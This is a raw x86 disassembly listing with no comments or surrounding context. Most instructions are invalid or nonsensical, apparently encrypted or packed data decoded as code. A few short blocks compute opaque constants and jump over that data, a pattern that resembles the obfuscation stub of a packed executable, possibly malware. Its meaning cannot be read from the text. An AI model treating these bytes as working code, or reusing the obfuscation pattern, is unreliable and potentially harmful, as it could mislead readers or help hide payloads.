  40d186:	mov    bl,0x77
  40d188:	and    cl,dh
  40d18a:	cmc    
  40d18b:	dec    esi
  40d18c:	xor    DWORD PTR [ebx],ebp
  40d18e:	dec    esi
  40d18f:	mov    WORD PTR [ebp-0x59b82048],cs
  40d195:	test   eax,0x5cf4e199
  40d19a:	xchg   ebx,ebp
  40d19c:	repz test BYTE PTR [edx],bh
  40d19f:	push   ecx
  40d1a0:	stos   BYTE PTR es:[edi],al
  40d1a1:	(bad)  
  40d1a2:	sbb    eax,0x9f847a0
  40d1a7:	fild   WORD PTR [ecx+0x3a]
  40d1aa:	std    
  40d1ab:	push   esi
  40d1ac:	cmp    DWORD PTR [edi],0xffffffae
  40d1af:	push   esi
  40d1b0:	into   
  40d1b1:	jmp    0x40d1a7
  40d1b3:	inc    edi
  40d1b4:	inc    edx
  40d1b5:	push   esp
  40d1b6:	mov    al,0x2b
  40d1b8:	dec    ebx
  40d1b9:	xor    dh,dh
  40d1bb:	repz fwait
  40d1bd:	cmp    DWORD PTR [esi+ebx*1+0x69],esi
  40d1c1:	out    dx,al
  40d1c2:	test   eax,0x53631fe4
  40d1c7:	test   BYTE PTR [ecx-0x1b],cl
  40d1ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1cb:	or     al,0xb6
  40d1cd:	aas    
  40d1ce:	fnstsw WORD PTR [ecx+esi*8-0x37]
  40d1d2:	sar    BYTE PTR ds:0xc866c2ba,1
  40d1d8:	inc    ecx
  40d1d9:	push   ecx
  40d1da:	jb     0x40d1b8
  40d1dc:	sub    ecx,0x8165870e
  40d1e2:	pusha  
  40d1e3:	hlt    
  40d1e4:	lds    esp,FWORD PTR [ebp-0x611dbb89]
  40d1ea:	jae    0x40d1a5
  40d1ec:	cmp    DWORD PTR [eax+0x28],0x4c06d0c1
  40d1f3:	push   ecx
  40d1f4:	out    dx,al
  40d1f5:	retfw  0x22e0
  40d1f9:	and    cl,BYTE PTR [ebx-0x8]
  40d1fc:	cmp    DWORD PTR [ecx-0x638e8cbd],eax
  40d202:	or     ebp,DWORD PTR [edx]
  40d204:	es stos DWORD PTR es:[edi],eax
  40d206:	mov    DWORD PTR [edi+0x57],ebp
  40d209:	mov    edi,gs
  40d20b:	sub    cl,dh
  40d20d:	adc    DWORD PTR [ecx],eax
  40d20f:	fisub  WORD PTR [eax]
  40d211:	or     DWORD PTR [ecx],eax
  40d213:	adc    al,0xc9
  40d215:	fwait
  40d216:	loope  0x40d1f9
  40d218:	mov    eax,0x94c16053
  40d21d:	xchg   ebp,eax
  40d21e:	int    0xb5
  40d220:	bound  esp,QWORD PTR [ecx]
  40d222:	jp     0x40d27b
  40d224:	(bad)  
  40d225:	mov    bl,0x7c
  40d227:	inc    ecx
  40d228:	xchg   edx,eax
  40d229:	sbb    DWORD PTR [ebx+0x16184895],eax
  40d22f:	out    dx,eax
  40d230:	sti    
  40d231:	xchg   ecx,eax
  40d232:	bound  esp,QWORD PTR [ebx+esi*8]
  40d235:	xchg   ebp,eax
  40d236:	es jg  0x40d1e6
  40d239:	mov    bl,0xdd
  40d23b:	jno    0x40d279
  40d23d:	pop    es
  40d23e:	xor    al,0xcc
  40d240:	call   0x12ee:0xd20684bd
  40d247:	mov    bh,0xfb
  40d249:	sbb    al,0xe1
  40d24b:	sub    DWORD PTR [esi+ebp*1-0x692db7f6],0x6315a30f
  40d256:	adc    esi,ebx
  40d258:	in     al,0x84
  40d25a:	test   DWORD PTR [ecx-0x2d],ecx
  40d25d:	inc    ebp
  40d25e:	mov    BYTE PTR [esi+ecx*1],al
  40d261:	mov    eax,DWORD PTR [ebp-0x14]
  40d264:	mov    esi,DWORD PTR [ebp-0x18]
  40d267:	and    eax,0x2389
  40d26c:	xor    eax,0x695
  40d271:	xor    edx,edx
  40d273:	div    esi
  40d275:	lea    ecx,[ecx+eax*1-0x2413]
  40d27c:	mov    eax,DWORD PTR [ebp-0x1c]
  40d27f:	add    eax,DWORD PTR [ebp-0x20]
  40d282:	mov    edx,DWORD PTR [ebp-0x24]
  40d285:	and    eax,edx
  40d287:	mov    edx,DWORD PTR [ebp-0x28]
  40d28a:	imul   eax,edx
  40d28d:	mov    edx,0xd0c8f
  40d292:	sub    edx,eax
  40d294:	cmp    ecx,edx
  40d296:	jbe    0x40cf3b
  40d29c:	push   0x2
  40d29e:	pop    eax
  40d29f:	mov    DWORD PTR [ebp-0x1c],eax
  40d2a2:	mov    DWORD PTR [ebp-0x20],ebx
  40d2a5:	mov    DWORD PTR [ebp-0x24],0x5
  40d2ac:	mov    DWORD PTR [ebp-0x28],0x6686
  40d2b3:	mov    DWORD PTR [ebp-0x8],0x7cf1
  40d2ba:	mov    DWORD PTR [ebp-0x4],eax
  40d2bd:	mov    DWORD PTR [ebp+0x8],0x739a
  40d2c4:	mov    DWORD PTR [ebp-0xc],0xf3a
  40d2cb:	xor    edx,edx
  40d2cd:	mov    DWORD PTR [ebp-0x10],0x429
  40d2d4:	mov    eax,DWORD PTR [ebp-0x28]
  40d2d7:	mov    ecx,DWORD PTR [ebp-0x24]
  40d2da:	sub    eax,0x175c
  40d2df:	div    ecx
  40d2e1:	jmp    0x40d5a5
  40d2e6:	test   DWORD PTR [esi],esi
  40d2e8:	push   eax
  40d2e9:	inc    edx
  40d2ea:	sbb    bl,BYTE PTR [edx]
  40d2ec:	jnp    0x40d324
  40d2ee:	inc    esp
  40d2ef:	sbb    DWORD PTR [edi+0x7c],esi
  40d2f2:	push   ds
  40d2f3:	inc    eax
  40d2f4:	imul   esi,DWORD PTR [eax+0x1818e22d],0xffffffd2
  40d2fb:	adc    al,0x18
  40d2fd:	sbb    BYTE PTR [ecx-0x41],ch
  40d300:	addr16 das 
  40d302:	clc    
  40d303:	mov    dl,0xb
  40d305:	test   eax,0x30e4caf
  40d30a:	push   0xcca28bcf
  40d30f:	push   edx
  40d310:	add    edi,esi
  40d312:	hlt    
  40d313:	jp     0x40d351
  40d315:	pop    ebx
  40d316:	pusha  
  40d317:	adc    edx,ecx
  40d319:	pop    edx
  40d31a:	aas    
  40d31b:	or     ebp,DWORD PTR [ebx-0x76]
  40d31e:	mov    bh,0xf
  40d320:	jl     0x40d39a
  40d322:	mov    al,ds:0xcd03e33e
  40d327:	cmc    
  40d328:	mov    al,ds:0x3da7c44e
  40d32d:	jl     0x40d342
  40d32f:	push   cs
  40d330:	aam    0xcd
  40d332:	push   es
  40d333:	and    eax,esp
  40d335:	jno    0x40d2d0
  40d337:	jl     0x40d376
  40d339:	pop    esi
  40d33a:	jle    0x40d33c
  40d33c:	out    0xee,al
  40d33e:	in     al,dx
  40d33f:	mov    ebx,0x99d33355
  40d344:	test   BYTE PTR [edx-0x16],al
  40d347:	jno    0x40d38f
  40d349:	cmp    eax,DWORD PTR [edi]
  40d34b:	add    ecx,ebp
  40d34d:	ins    BYTE PTR es:[edi],dx
  40d34e:	mov    al,ds:0xfe712b68
  40d353:	sbb    eax,0x8cbdaa50
  40d358:	loopne 0x40d384
  40d35a:	mov    bh,0x83
  40d35c:	xchg   ebp,eax
  40d35d:	xchg   esi,eax
  40d35e:	test   DWORD PTR ds:0xe7ecde17,0x1d34d2e1
  40d368:	mov    bh,BYTE PTR [edi-0x39556e32]
  40d36e:	mov    eax,0xf8675cac
  40d373:	jmp    0x40d394
  40d375:	ror    edi,cl
  40d377:	pop    ebx
  40d378:	pushf  
  40d379:	arpl   WORD PTR [ecx+ebx*8-0x80],ax
  40d37d:	rcl    bh,cl
  40d37f:	push   ebp
  40d380:	ss mov esp,0x156d2ba2
  40d386:	mov    ch,0x8
  40d388:	adc    ebp,esi
  40d38a:	or     ch,0xe6
  40d38d:	(bad)  
  40d38e:	and    esi,ebp
  40d390:	cdq    
  40d391:	jbe    0x40d36d
  40d393:	mov    edi,0x18c4c97a
  40d398:	aas    
  40d399:	sub    eax,0x1d449190
  40d39e:	aad    0xc4
  40d3a0:	das    
  40d3a1:	ds ins DWORD PTR es:[edi],dx
  40d3a3:	sub    WORD PTR [edi+edi*2],sp
  40d3a7:	popf   
  40d3a8:	retf   0x7e69
  40d3ab:	into   
  40d3ac:	lock pop esp
  40d3ae:	and    dh,BYTE PTR ds:0x3dfdc32
  40d3b4:	jp     0x40d37f
  40d3b6:	cmp    al,0x6b
  40d3b8:	aad    0x8b
  40d3ba:	pop    ds
  40d3bb:	stos   BYTE PTR es:[edi],al
  40d3bc:	or     eax,0x44c91390
  40d3c1:	or     BYTE PTR [ebx],bh
  40d3c3:	cmp    BYTE PTR [ebx],0xad
  40d3c6:	loop   0x40d3f0
  40d3c8:	or     cl,BYTE PTR [esi+0x6bcfbcda]
  40d3ce:	repnz add ebx,ebx
  40d3d1:	jmp    0xcb9a17be
  40d3d6:	pop    ebp
  40d3d7:	(bad)  
  40d3d8:	sub    bh,BYTE PTR [ebx+edx*8]
  40d3db:	pusha  
  40d3dc:	mov    cl,0x53
  40d3de:	(bad)  
  40d3df:	mov    ebx,0x565d6509
  40d3e4:	retf   0x68fc
  40d3e7:	pop    ss
  40d3e8:	or     ebx,ebx
  40d3ea:	inc    esi
  40d3eb:	leave  
  40d3ec:	mov    ds:0x18009bfb,eax
  40d3f1:	adc    DWORD PTR [edi-0x16abd6b9],esp
  40d3f7:	xor    eax,0x78727356
  40d3fc:	sub    cl,dl
  40d3fe:	ins    BYTE PTR es:[edi],dx
  40d3ff:	test   DWORD PTR [ecx],eax
  40d401:	add    bl,BYTE PTR [esi+0x1959f3fb]
  40d407:	stos   DWORD PTR es:[edi],eax
  40d408:	cmp    ah,BYTE PTR [esi-0x42]
  40d40b:	dec    esi
  40d40c:	mov    bl,BYTE PTR ds:0xbc29efc8
  40d412:	mov    ecx,0xe7fd5b63
  40d417:	popf   
  40d418:	add    al,BYTE PTR [edx-0x2e49d414]
  40d41e:	xor    ebx,DWORD PTR [eax+0x695c68a8]
  40d424:	lahf   
  40d425:	sti    
  40d426:	sti    
  40d427:	popf   
  40d428:	out    0xbd,eax
  40d42a:	add    BYTE PTR [edi-0x1ae662cd],ah
  40d430:	cmp    eax,DWORD PTR [ecx+0x70]
  40d433:	xor    ebx,DWORD PTR [edi]
  40d435:	sub    eax,esp
  40d437:	or     esp,ebp
  40d439:	sub    esp,DWORD PTR [eax+0x310a809e]
  40d43f:	inc    esp
  40d440:	int    0xc3
  40d442:	mov    eax,ds:0xe38e6916
  40d447:	in     eax,dx
  40d448:	sbb    BYTE PTR [ecx+0x20cc85cf],ch
  40d44e:	cmp    eax,0x1202a7bb
  40d453:	jle    0x40d440
  40d455:	(bad)  [edx-0x14]
  40d458:	sbb    BYTE PTR [eax-0x4034617c],bh
  40d45e:	push   ds
  40d45f:	push   esi
  40d460:	hlt    
  40d461:	iret   
  40d462:	and    BYTE PTR [edi+0x10250f72],dl
  40d468:	ins    DWORD PTR es:[edi],dx
  40d469:	std    
  40d46a:	add    ch,BYTE PTR [ebx]
  40d46c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d46d:	add    ebp,ecx
  40d46f:	sbb    edx,esp
  40d471:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d472:	push   edi
  40d473:	adc    eax,DWORD PTR [edx+0x3bebfd3c]
  40d479:	cmp    dl,BYTE PTR [edx-0x7a]
  40d47c:	mov    edi,0x566204a7
  40d481:	inc    ecx
  40d482:	mov    ah,0xb7
  40d484:	bound  edx,QWORD PTR [edi-0x6f]
  40d487:	cdq    
  40d488:	fistp  WORD PTR [eax+0x765095e3]
  40d48e:	test   al,0x3a
  40d490:	sbb    dl,BYTE PTR [ebp-0x11f782c6]
  40d496:	dec    ebx
  40d497:	dec    edx
  40d498:	adc    BYTE PTR [esi+ebp*4+0x3eca1953],cl
  40d49f:	neg    cl
  40d4a1:	cmp    al,0xb9
  40d4a3:	fdivr  DWORD PTR [esi-0x7a8ba9f3]
  40d4a9:	cmc    
  40d4aa:	sub    ecx,DWORD PTR [ecx-0x4cd0f2c1]
  40d4b0:	inc    ecx
  40d4b1:	call   0xbd41a1
  40d4b6:	cmc    
  40d4b7:	mov    ebx,0x325772b4
  40d4bc:	test   al,0xd6
  40d4be:	loope  0x40d478
  40d4c0:	test   al,0xd8
  40d4c2:	(bad)  
  40d4c3:	or     DWORD PTR [edi+edi*4],edi
  40d4c6:	fcmovnu st,st(4)
  40d4c8:	sbb    DWORD PTR [eax+0x1d],0x22fd0b6b
  40d4cf:	cmp    edx,DWORD PTR [esi+0x4a]
  40d4d2:	fistp  QWORD PTR [ebx-0x45]
  40d4d5:	jbe    0x40d513
  40d4d7:	adc    DWORD PTR [ebp+0x318a683c],esi
  40d4dd:	push   edi
  40d4de:	out    dx,eax
  40d4df:	xchg   edi,ebx
  40d4e1:	dec    eax
  40d4e2:	or     ecx,0xebb5e574
  40d4e8:	push   ss
  40d4e9:	push   ecx
  40d4ea:	fs mov esp,ecx
  40d4ed:	mov    eax,ds:0xfdeb7d3e
  40d4f2:	and    dh,BYTE PTR [edx+0x6360379a]
  40d4f8:	adc    BYTE PTR [ebp+0x6a],ah
  40d4fb:	sbb    bh,BYTE PTR [ebp-0x113424d3]
  40d501:	loope  0x40d513
  40d503:	cs mov dh,0xb2
  40d506:	lea    edx,[edi]
  40d508:	call   0x7b78:0x1b093e3c
  40d50f:	aaa    
  40d510:	mov    ds:0x9e5a29e1,eax
  40d515:	and    BYTE PTR [eax],dl
  40d517:	dec    DWORD PTR [ebx+0x66]
  40d51a:	xchg   esi,eax
  40d51b:	xor    esi,DWORD PTR [ecx+0x61]
  40d51e:	js     0x40d545
  40d520:	and    al,0x5c
  40d522:	retw   0x980a
  40d526:	add    dh,bh
  40d528:	cmp    al,0xb4
  40d52a:	pop    eax
  40d52b:	fstp   st(5)
  40d52d:	jge    0x40d5aa
  40d52f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d530:	mov    bl,0x3b
  40d532:	sbb    dl,ah
  40d534:	jo     0x40d4fb
  40d536:	xlat   BYTE PTR ds:[ebx]
  40d537:	cmp    al,0xe7
  40d539:	and    ebx,DWORD PTR [ebx+esi*4+0x23]
  40d53d:	sbb    al,0x2c
  40d53f:	ds jp  0x40d567
  40d542:	push   0xbe1d679e
  40d547:	popf   
  40d548:	mov    cs,WORD PTR [ecx+0x6]
  40d54b:	add    BYTE PTR [edx-0x2e6acd4a],dl
  40d551:	xor    eax,0x7d4dc325
  40d556:	aaa    
  40d557:	mov    ebp,0x2d47a7de
  40d55c:	sahf   
  40d55d:	jmp    0x40d4e5
  40d55f:	lahf   
  40d560:	enter  0xc28b,0xdb
  40d564:	pop    ecx
  40d565:	push   0x275b2ba5
  40d56a:	cli    
  40d56b:	xor    ah,dl
  40d56d:	imul   edx,DWORD PTR [edx-0x1b],0xffffffd7
  40d571:	(bad)  
  40d572:	retf   
  40d573:	leave  
  40d574:	fistp  QWORD PTR [ebx+0x37705cb1]
  40d57a:	ins    DWORD PTR es:[edi],dx
  40d57b:	sbb    eax,0x2c7eabbd
  40d580:	push   es
  40d581:	(bad)  
  40d582:	xor    eax,0xc07e1c23
  40d587:	pop    es
  40d588:	pop    edx
  40d589:	iret   
  40d58a:	pop    esp
  40d58b:	in     al,0xf6
  40d58d:	push   cs
  40d58e:	repnz adc eax,DWORD PTR [eax+0x5a]
  40d592:	adc    dh,BYTE PTR [ecx]
  40d594:	mov    al,0x49
  40d596:	imul   edi,DWORD PTR [eax-0x13],0x5
  40d59a:	loop   0x40d5fd
  40d59c:	shl    BYTE PTR [eax],cl
  40d59e:	dec    eax
  40d59f:	(bad)  
  40d5a0:	ficomp WORD PTR [eax-0x70]
  40d5a3:	pusha  
  40d5a4:	push   0x33e04d8b
  40d5a9:	shr    cl,cl
  40d5ab:	mov    edi,0x5a000002
  40d5b0:	fdiv   DWORD PTR [edi+0x64]
  40d5b3:	sbb    esp,DWORD PTR [edx]
  40d5b5:	pop    edx
  40d5b6:	into   
  40d5b7:	sbb    edi,ecx
  40d5b9:	jae    0x40d637
  40d5bb:	pcmpgtb mm5,QWORD PTR [ecx+0x18dce7bc]
  40d5c2:	sbb    dl,dl
  40d5c4:	adc    al,0x18
  40d5c6:	sbb    BYTE PTR [eax-0x451eb1d0],ch
  40d5cc:	das    
  40d5cd:	aad    0xee
  40d5cf:	add    dh,BYTE PTR [edi+ecx*8]
  40d5d2:	psubsb mm1,mm7
  40d5d5:	dec    ecx
  40d5d6:	daa    
  40d5d7:	dec    eax
  40d5d8:	fistp  DWORD PTR [ebp+0x2e]
  40d5db:	pop    ebx
  40d5dc:	js     0x40d5b4
  40d5de:	or     edi,DWORD PTR [esi]
  40d5e0:	lods   al,BYTE PTR ds:[esi]
  40d5e1:	mov    edx,0x2781f2f8
  40d5e6:	dec    esi
  40d5e7:	jbe    0x2d93c9a0
  40d5ed:	jne    0x40d64e
  40d5ef:	adc    ch,BYTE PTR [edi-0x2f424493]
  40d5f5:	in     al,dx
  40d5f6:	fld    DWORD PTR [ebx+0x6c]
  40d5f9:	es and eax,0x621a306d
  40d5ff:	add    edx,ebp
  40d601:	clc    
  40d602:	fwait
  40d603:	jns    0x40d674
  40d605:	test   cl,ch
  40d607:	add    al,BYTE PTR [edx+0x54]
  40d60a:	sub    DWORD PTR [edi],edi
  40d60c:	push   ebp
  40d60d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d60e:	or     ecx,esp
  40d610:	shl    edx,1
  40d612:	aam    0xb3
  40d614:	and    eax,DWORD PTR [ebp+0x5c]
  40d617:	mov    ?,WORD PTR [edi+eax*1]
  40d61a:	jb     0x40d5e2
  40d61c:	or     eax,0x3d5477d7
  40d621:	dec    ebx
  40d622:	mov    WORD PTR [edx-0x2a398e15],ss
  40d628:	cdq    
  40d629:	xchg   ebx,eax
  40d62a:	retf   0x69e
  40d62d:	xlat   BYTE PTR ds:[ebx]
  40d62e:	push   ebx
  40d62f:	clc    
  40d630:	and    DWORD PTR [ebx-0x68615b00],edx
  40d636:	repnz add eax,DWORD PTR [eax+0x37fd1c3d]
  40d63d:	dec    ebx
  40d63e:	push   ecx
  40d63f:	cld    
  40d640:	mov    dh,dl
  40d642:	rcl    bh,cl
  40d644:	ss jl  0x40d612
  40d647:	or     cl,al
  40d649:	jb     0x40d5e7
  40d64b:	sub    al,0x53
  40d64d:	dec    ebp
  40d64e:	pop    edx
  40d64f:	add    dl,ch
  40d651:	push   ds
  40d652:	scas   al,BYTE PTR es:[edi]
  40d653:	ja     0x40d657
  40d655:	push   ds
  40d656:	sbb    eax,0xd6459d55
  40d65b:	jmp    0x1103:0xef398696
  40d662:	add    edi,DWORD PTR [ebx-0x2647d86]
  40d668:	push   cs
  40d669:	imul   ebx,edi,0x21f100c8
  40d66f:	test   ebx,eax
  40d671:	es mov edi,0x751292a0
  40d677:	add    DWORD PTR [edi+0x31],esi
  40d67a:	repnz add al,0xa6
  40d67d:	scas   eax,DWORD PTR es:[edi]
  40d67e:	je     0x40d6b7
  40d680:	xchg   ebx,eax
  40d681:	jmp    0x88960798
  40d686:	es jne 0x40d6a0
  40d689:	pop    es
  40d68a:	imul   edx,DWORD PTR [edx+edx*4+0x8a2114e],0x73
  40d692:	call   0x8624:0x7f7e1358
  40d699:	pop    esi
  40d69a:	fnstenv [edx+0x4a]
  40d69d:	xchg   esp,eax
  40d69e:	adc    BYTE PTR [esi+0x173f0c26],bh
  40d6a4:	and    al,BYTE PTR [ecx-0xf]
  40d6a7:	mov    dl,0xe9
  40d6a9:	in     al,dx
  40d6aa:	lods   eax,DWORD PTR ds:[esi]
  40d6ab:	add    BYTE PTR [edi+ebp*8-0x6893180c],ch
  40d6b2:	call   0xdd8d10a9
  40d6b7:	sub    ax,0xcf8d
  40d6bb:	test   eax,0x48558893
  40d6c0:	fcomp  QWORD PTR [ecx-0x58bcafa0]
  40d6c6:	cmp    esi,DWORD PTR [eax-0x5bd6bc9a]
  40d6cc:	inc    edi
  40d6cd:	mov    esi,0x2d1ea2ff
  40d6d2:	stos   DWORD PTR es:[edi],eax
  40d6d3:	push   ds
  40d6d4:	mov    edi,esi
  40d6d6:	imul   BYTE PTR [edi-0x7484f932]
  40d6dc:	in     al,dx
  40d6dd:	ins    BYTE PTR es:[edi],dx
  40d6de:	ret    0xe574
  40d6e1:	fwait
  40d6e2:	(bad)  
  40d6e3:	cli    
  40d6e4:	cmp    BYTE PTR [edx+0x53],bl
  40d6e7:	rcr    BYTE PTR [ecx+ebx*4],1
  40d6ea:	sbb    DWORD PTR [ebp-0x1e926dc3],edx
  40d6f0:	or     ecx,DWORD PTR ds:0xfac9b4aa
  40d6f6:	mov    esi,0xcf7fe14
  40d6fb:	cmc    
  40d6fc:	loopne 0x40d6da
  40d6fe:	fwait
  40d6ff:	xchg   esi,eax
  40d700:	fisttp WORD PTR [esi]
  40d702:	scas   al,BYTE PTR es:[edi]
  40d703:	out    0x61,eax
  40d705:	ror    esi,cl
  40d707:	or     ah,cl
  40d709:	inc    ecx
  40d70a:	xor    DWORD PTR ds:0x90da7bdd,ebp
  40d710:	outs   dx,BYTE PTR ds:[esi]
  40d711:	(bad)  
  40d712:	and    al,0x9c
  40d714:	sbb    dh,BYTE PTR [ecx]
  40d716:	sub    ah,BYTE PTR [ebx]
  40d718:	and    al,0xfe
  40d71a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d71b:	imul   esp,DWORD PTR [ebp+0x12400299],0xffffffea
  40d722:	retf   0x22a4
  40d725:	cmp    al,0x7
  40d727:	retf   
  40d728:	fcmovu st,st(5)
  40d72a:	popa   
  40d72b:	lock adc eax,0xb86a7d0a
  40d731:	push   es
  40d732:	(bad)  
  40d733:	dec    ebx
  40d734:	dec    edi
  40d735:	rol    DWORD PTR [ecx],0xa7
  40d738:	dec    ecx
  40d739:	mov    ds:0xaf27c769,eax
  40d73e:	push   es
  40d73f:	pop    ebp
  40d740:	sahf   
  40d741:	adc    al,0xb7
  40d743:	jns    0x40d70f
  40d745:	mov    dh,0xa7
  40d747:	xor    ecx,esp
  40d749:	repnz pop eax
  40d74b:	(bad)  
  40d74c:	mov    ebp,0x2b1fce99
  40d751:	out    dx,eax
  40d752:	gs (bad) 
  40d754:	fld    DWORD PTR [edi]
  40d756:	sbb    BYTE PTR [ecx+0x19],0x14
  40d75a:	adc    DWORD PTR [esi+0x1ace8375],ecx
  40d760:	cmp    eax,0xf623bd64
  40d765:	test   eax,0xb18cc21e
  40d76a:	out    0xe6,eax
  40d76c:	xchg   DWORD PTR [ebx+0x478e0243],eax
  40d772:	or     eax,DWORD PTR [ebx]
  40d774:	jl     0x40d780
  40d776:	sub    ebp,DWORD PTR [ebp-0x67]
  40d779:	ss push 0x47
  40d77c:	push   cs
  40d77d:	in     al,dx
  40d77e:	ds mov ch,0x7d
  40d781:	inc    esp
  40d782:	retf   0x85e2
  40d785:	std    
  40d786:	jne    0x40d740
  40d788:	or     eax,0xa970abe7
  40d78d:	adc    eax,0x3267a1f7
  40d792:	xor    ecx,esp
  40d794:	ja     0x40d7eb
  40d796:	inc    ecx
  40d797:	xchg   BYTE PTR [edx-0x30d9c9b1],al
  40d79d:	call   0x487bfc99
  40d7a2:	jecxz  0x40d76b
  40d7a4:	loopne 0x40d794
  40d7a6:	sbb    eax,0x6d368c9a
  40d7ab:	mov    bl,0xa7
  40d7ad:	es in  al,0xdb
  40d7b0:	aaa    
  40d7b1:	gs in  eax,dx
  40d7b3:	das    
  40d7b4:	ret    0xe43
  40d7b7:	dec    edx
  40d7b8:	ja     0x40d78b
  40d7ba:	fwait
  40d7bb:	pusha  
  40d7bc:	add    ebp,DWORD PTR [ecx+0x4]
  40d7bf:	sub    al,0x74
  40d7c1:	sbb    eax,DWORD PTR [ecx+0x74]
  40d7c4:	or     bl,BYTE PTR [edx]
  40d7c6:	int3   
  40d7c7:	iret   
  40d7c8:	mov    bl,0xa5
  40d7ca:	sti    
  40d7cb:	dec    eax
  40d7cc:	outs   dx,BYTE PTR ds:[esi]
  40d7cd:	and    ebp,DWORD PTR [eax-0x68]
  40d7d0:	mov    esi,0x22b82667
  40d7d5:	data16 jp 0x40d76a
  40d7d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7d9:	mov    DWORD PTR [eax+0xd],esi
  40d7dc:	in     al,0x87
  40d7de:	(bad)  
  40d7df:	inc    ebx
  40d7e0:	add    ah,al
  40d7e2:	inc    esi
  40d7e3:	sbb    al,0x5
  40d7e5:	std    
  40d7e6:	jmp    0x95521443
  40d7eb:	jl     0x40d7b9
  40d7ed:	and    DWORD PTR [ebx],ebp
  40d7ef:	jmpw   0x50c7
  40d7f3:	aaa    
  40d7f4:	jno    0x40d7f9
  40d7f6:	es and al,0x74
  40d7f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7fa:	call   0x5eaa643c
  40d7ff:	icebp  
  40d800:	out    0x2a,eax
  40d802:	push   ss
  40d803:	sahf   
  40d804:	mov    ds:0x79e9cf99,al
  40d809:	popa   
  40d80a:	xor    ebp,ebx
  40d80c:	loope  0x40d7f6
  40d80e:	in     al,0x71
  40d810:	mov    al,ds:0x41e7e9c9
  40d815:	ds (bad) 
  40d817:	fldcw  WORD PTR [ecx]
  40d819:	in     al,dx
  40d81a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d81b:	int    0x14
  40d81d:	inc    edx
  40d81e:	fsubr  st(7),st
  40d820:	jecxz  0x40d865
  40d822:	in     eax,dx
  40d823:	adc    BYTE PTR ss:[ebx-0x73],al
  40d827:	(bad)  
  40d828:	mov    al,0x89
  40d82b:	jno    0x40d80f
  40d82d:	int    0xd7
  40d82f:	test   eax,0xa6756bc2
  40d834:	call   0x5b3b:0x46f9e2b2
  40d83b:	stos   BYTE PTR es:[edi],al
  40d83c:	adc    DWORD PTR [edi+edx*2+0x438091d8],edi
  40d843:	cmp    ch,0xe8
  40d846:	popa   
  40d847:	add    DWORD PTR [ecx],edx
  40d849:	stos   DWORD PTR es:[edi],eax
  40d84a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d84b:	and    BYTE PTR [eax+eiz*2],cl
  40d84e:	jmp    0x40d82f
  40d850:	push   ds
  40d851:	fsubr  QWORD PTR [ecx-0x49]
  40d854:	rcr    BYTE PTR [edi-0x7e5715e7],1
  40d85a:	mov    ch,0x44
  40d85c:	mov    edi,0xceac7d41
  40d861:	sbb    al,0xcb
  40d863:	mov    ebp,0x42eaf4b3
  40d868:	idiv   DWORD PTR [eax]
  40d86a:	popa   
  40d86b:	fild   QWORD PTR [eax+0x30]
  40d86e:	mov    edi,0x4db5
  40d873:	div    ecx
  40d875:	mov    ecx,DWORD PTR [ebp-0x1c]
  40d878:	xor    edx,edx
  40d87a:	div    ecx
  40d87c:	xor    edx,edx
  40d87e:	mov    ecx,eax
  40d880:	jmp    0x40db44
  40d885:	aam    0x63
  40d887:	sbb    eax,0xcc1a1a64
  40d88c:	and    edx,DWORD PTR [ebp+0x79]
  40d88f:	test   eax,0xe7738fbc
  40d894:	stos   BYTE PTR es:[edi],al
  40d895:	mov    al,ds:0xd21818d8
  40d89a:	adc    al,0x18
  40d89c:	sbb    BYTE PTR [eax+0xb295372],ch
  40d8a2:	xchg   edi,eax
  40d8a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8a4:	cmp    al,0x15
  40d8a6:	call   0xd390:0xbf0bcc01
  40d8ad:	sub    DWORD PTR [ecx+0x16],ebp
  40d8b0:	cmp    bl,cl
  40d8b2:	mov    WORD PTR gs:[ebx+ebx*8+0x5efa0232],ss
  40d8ba:	pop    eax
  40d8bb:	aas    
  40d8bc:	retf   
  40d8bd:	(bad)  
  40d8be:	sbb    bl,bl
  40d8c0:	xchg   BYTE PTR [esi-0x6ae3102a],al
  40d8c6:	jno    0x40d882
  40d8c8:	cmp    bl,BYTE PTR [ecx-0x39]
  40d8cb:	jnp    0x40d900
  40d8cd:	adc    ecx,DWORD PTR [eax]
  40d8cf:	stos   BYTE PTR es:[edi],al
  40d8d0:	pop    ss
  40d8d1:	jl     0x40d915
  40d8d3:	xchg   esi,eax
  40d8d4:	lods   al,BYTE PTR ds:[esi]
  40d8d5:	pop    eax
  40d8d6:	cmp    dh,BYTE PTR [esi]
  40d8d8:	inc    eax
  40d8d9:	psrlq  mm6,QWORD PTR [ecx-0x125f476a]
  40d8e0:	es push edx
  40d8e2:	inc    ecx
  40d8e3:	mov    esi,0xad14605
  40d8e8:	jl     0x40d92d
  40d8ea:	out    dx,eax
  40d8eb:	aad    0xe1
  40d8ed:	imul   edx,DWORD PTR [edx+esi*4],0x620905ba
  40d8f4:	mov    dh,dh
  40d8f6:	pop    ss
  40d8f7:	mov    edi,DWORD PTR [ebp+0x27cc272]
  40d8fd:	push   0xffffffc3
  40d8ff:	cmc    
  40d900:	or     ebp,DWORD PTR [esi-0x36]
  40d903:	adc    ebx,DWORD PTR [edi]
  40d905:	popa   
  40d906:	dec    edx
  40d907:	lods   al,BYTE PTR ds:[esi]
  40d908:	mov    al,0x48
  40d90a:	xchg   edi,eax
  40d90b:	sub    BYTE PTR [eax],bh
  40d90d:	ins    DWORD PTR es:[edi],dx
  40d90e:	push   es
  40d90f:	push   esp
  40d910:	out    0x49,al
  40d912:	xor    BYTE PTR [eax+edx*4+0x25c0ce17],ah
  40d919:	jae    0x40d8fb
  40d91b:	clc    
  40d91c:	mov    ah,0x29
  40d91e:	in     al,0x5e
  40d920:	repnz call 0xa368:0x8bad824e
  40d928:	(bad)  
  40d929:	aaa    
  40d92a:	inc    ecx
  40d92b:	adc    al,0x92
  40d92d:	mov    edi,esi
  40d92f:	xchg   ah,ch
  40d931:	jae    0x40d944
  40d933:	sbb    esi,DWORD PTR [ecx]
